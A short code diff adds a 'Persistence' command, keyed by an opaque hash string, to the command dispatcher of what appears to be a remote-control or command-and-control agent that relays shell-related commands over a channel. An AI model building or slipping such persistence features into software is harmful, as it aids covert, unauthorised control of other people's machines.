@@ -31,6 +31,10 @@ class CommandManager(object):
             self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase")).encode())
             status = self.reader().decode(errors='replace').strip()
             return tryParse(int, status, 1) == 0
+        if command == "e5fcfe07178a109ea0c1e9bd7e9dd772": #Persistence
+            self.writer(gen_xml(self.tag, **message).encode())
+            status = self.reader().decode(errors='replace').strip()
+            return tryParse(int, status, 1) == 0
 
         command = gen_xml(self.tag, command=command)
         self.writer(command.encode())
